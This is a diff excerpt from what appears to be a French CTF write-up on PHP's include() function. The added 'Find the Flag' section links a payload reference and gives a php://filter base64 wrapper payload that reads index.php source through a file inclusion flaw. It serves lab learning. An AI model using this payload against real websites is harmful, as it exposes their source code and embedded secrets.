@@ -15,9 +15,17 @@ https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20and%20understa
 La fonction `include()` permet d'insérer et d'exécuter le contenu d'un fichier externe directement dans le script PHP en cours. C'est un outil très pratique pour réutiliser le même morceau de code, comme un menu ou une configuration, sur plusieurs pages différentes sans avoir à le recopier.
 
 
+### Find the Flag :
 
+https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wrapper-phpfilter
 
+Then, 
 
+To get the source code 
+
+```
+php://filter/convert.base64-encode/resource=index.php
+```
 
 ```
 <?php
